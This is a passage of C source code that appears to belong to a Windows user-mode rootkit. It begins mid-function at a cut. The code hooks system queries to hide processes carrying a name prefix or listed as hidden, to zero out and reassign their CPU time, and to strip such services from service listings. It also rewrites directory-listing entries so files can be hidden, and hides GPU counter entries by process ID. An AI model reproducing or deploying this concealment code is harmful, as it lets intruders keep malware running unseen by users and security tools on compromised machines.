	if (NT_SUCCESS(OriginalNtQuerySystemInformation(SystemProcessInformation, systemInformation, 1024 * 1024 * 2, &returnLength)))
	{
		if (hiddenKernelTime) hiddenKernelTime->QuadPart = 0;
		if (hiddenUserTime) hiddenUserTime->QuadPart = 0;
		if (hiddenCycleTime) *hiddenCycleTime = 0;

		for (PNT_SYSTEM_PROCESS_INFORMATION current = (PNT_SYSTEM_PROCESS_INFORMATION)systemInformation, previous = NULL; current;)
		{
			if (HasPrefixU(current->ImageName) || IsProcessIdHidden((DWORD)(DWORD_PTR)current->ProcessId) || IsProcessNameHiddenU(current->ImageName))
			{
				if (hiddenKernelTime) hiddenKernelTime->QuadPart += current->KernelTime.QuadPart;
				if (hiddenUserTime) hiddenUserTime->QuadPart += current->UserTime.QuadPart;
				if (hiddenCycleTime) *hiddenCycleTime += current->CycleTime;
			}

			previous = current;

			if (current->NextEntryOffset) current = (PNT_SYSTEM_PROCESS_INFORMATION)((LPBYTE)current + current->NextEntryOffset);
			else current = NULL;
		}

		result = TRUE;
	}

	FREE(systemInformation);
	return result;
}
static LPWSTR CreatePath(LPWSTR result, LPCWSTR directoryName, LPCWSTR fileName)
{
	// PathCombineW cannot be used with the directory name "\\.\pipe\".
	if (!StrCmpIW(directoryName, L"\\\\.\\pipe\\"))
	{
		StrCpyW(result, directoryName);
		StrCatW(result, fileName);
		return result;
	}
	else
	{
		return PathCombineW(result, directoryName, fileName);
	}
}
static LPWSTR FileInformationGetName(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, LPWSTR name)
{
	PWCHAR fileName = NULL;
	ULONG fileNameLength = 0;

	switch (fileInformationClass)
	{
		case FileDirectoryInformation:
			fileName = ((PNT_FILE_DIRECTORY_INFORMATION)fileInformation)->FileName;
			fileNameLength = ((PNT_FILE_DIRECTORY_INFORMATION)fileInformation)->FileNameLength;
			break;
		case FileFullDirectoryInformation:
			fileName = ((PNT_FILE_FULL_DIR_INFORMATION)fileInformation)->FileName;
			fileNameLength = ((PNT_FILE_FULL_DIR_INFORMATION)fileInformation)->FileNameLength;
			break;
		case FileIdFullDirectoryInformation:
			fileName = ((PNT_FILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileName;
			fileNameLength = ((PNT_FILE_ID_FULL_DIR_INFORMATION)fileInformation)->FileNameLength;
			break;
		case FileBothDirectoryInformation:
			fileName = ((PNT_FILE_BOTH_DIR_INFORMATION)fileInformation)->FileName;
			fileNameLength = ((PNT_FILE_BOTH_DIR_INFORMATION)fileInformation)->FileNameLength;
			break;
		case FileIdBothDirectoryInformation:
			fileName = ((PNT_FILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileName;
			fileNameLength = ((PNT_FILE_ID_BOTH_DIR_INFORMATION)fileInformation)->FileNameLength;
			break;
		case FileNamesInformation:
			fileName = ((PNT_FILE_NAMES_INFORMATION)fileInformation)->FileName;
			fileNameLength = ((PNT_FILE_NAMES_INFORMATION)fileInformation)->FileNameLength;
			break;
	}

	if (fileName && fileNameLength > 0)
	{
		i_wmemcpy(name, fileName, fileNameLength / sizeof(WCHAR));
		name[fileNameLength / sizeof(WCHAR)] = L'\0';
		return name;
	}
	else
	{
		return NULL;
	}
}
static ULONG FileInformationGetNextEntryOffset(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass)
{
	switch (fileInformationClass)
	{
		case FileDirectoryInformation:
			return ((PNT_FILE_DIRECTORY_INFORMATION)fileInformation)->NextEntryOffset;
		case FileFullDirectoryInformation:
			return ((PNT_FILE_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset;
		case FileIdFullDirectoryInformation:
			return ((PNT_FILE_ID_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset;
		case FileBothDirectoryInformation:
			return ((PNT_FILE_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset;
		case FileIdBothDirectoryInformation:
			return ((PNT_FILE_ID_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset;
		case FileNamesInformation:
			return ((PNT_FILE_NAMES_INFORMATION)fileInformation)->NextEntryOffset;
		default:
			return 0;
	}
}
static VOID FileInformationSetNextEntryOffset(LPVOID fileInformation, FILE_INFORMATION_CLASS fileInformationClass, ULONG value)
{
	switch (fileInformationClass)
	{
		case FileDirectoryInformation:
			((PNT_FILE_DIRECTORY_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case FileFullDirectoryInformation:
			((PNT_FILE_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case FileIdFullDirectoryInformation:
			((PNT_FILE_ID_FULL_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case FileBothDirectoryInformation:
			((PNT_FILE_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case FileIdBothDirectoryInformation:
			((PNT_FILE_ID_BOTH_DIR_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
		case FileNamesInformation:
			((PNT_FILE_NAMES_INFORMATION)fileInformation)->NextEntryOffset = value;
			break;
	}
}
static VOID FilterEnumServiceStatus(LPENUM_SERVICE_STATUSW services, LPDWORD servicesReturned)
{
	for (DWORD i = 0; i < *servicesReturned; i++)
	{
		// If hidden, move all following entries up by one and decrease count.
		if (HasPrefix(services[i].lpServiceName) ||
			HasPrefix(services[i].lpDisplayName) ||
			IsServiceNameHidden(services[i].lpServiceName) ||
			IsServiceNameHidden(services[i].lpDisplayName))
		{
			memmove(&services[i], &services[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUSW));
			(*servicesReturned)--;
			i--;
		}
	}
}
static VOID FilterEnumServiceStatusProcess(LPENUM_SERVICE_STATUS_PROCESSW services, LPDWORD servicesReturned)
{
	for (DWORD i = 0; i < *servicesReturned; i++)
	{
		// If hidden, move all following entries up by one and decrease count.
		if (HasPrefix(services[i].lpServiceName) ||
			HasPrefix(services[i].lpDisplayName) ||
			IsServiceNameHidden(services[i].lpServiceName) ||
			IsServiceNameHidden(services[i].lpDisplayName))
		{
			memmove(&services[i], &services[i + 1], (*servicesReturned - i - 1) * sizeof(ENUM_SERVICE_STATUS_PROCESSW));
			(*servicesReturned)--;
			i--;
		}
	}
}
static BOOL GetIsHiddenFromPdhString(LPCWSTR str)
{
	// Parses a process ID from this type of string:
	// "pid_1234_luid_0x00000000_0x0000C9DE_phys_0_eng_0_engtype_3D"
	// ... and determines whether the PID is hidden

	DWORD processId = GetProcessIdFromPdhString(str);
	if (processId)
	{
		BOOL hidden = FALSE;

		if (IsProcessIdHidden(processId))
		{
			return TRUE;
		}
		else
		{
			WCHAR processName[MAX_PATH + 1];
			if (GetProcessFileName(processId, processName, MAX_PATH))
			{
				if (HasPrefix(processName) || IsProcessNameHidden(processName))
				{
					return TRUE;
				}
			}
		}
	}

	return FALSE;
}
static DWORD GetProcessIdFromPdhString(LPCWSTR str)
{
	// Parses a process ID from this type of string:
	// "pid_1234_luid_0x00000000_0x0000C9DE_phys_0_eng_0_engtype_3D"

	if (!StrCmpNW(str, L"pid_", 4))
	{
		str = &str[4];
		PWSTR endIndex = StrStrW(str, L"_");
		if (endIndex)
		{
			WCHAR pidString[10];

			DWORD strLength = endIndex - str;
			i_wmemcpy(pidString, str, strLength);
			pidString[strLength] = L'\0';

			return StrToIntW(pidString);
		}
	}

	return 0;
}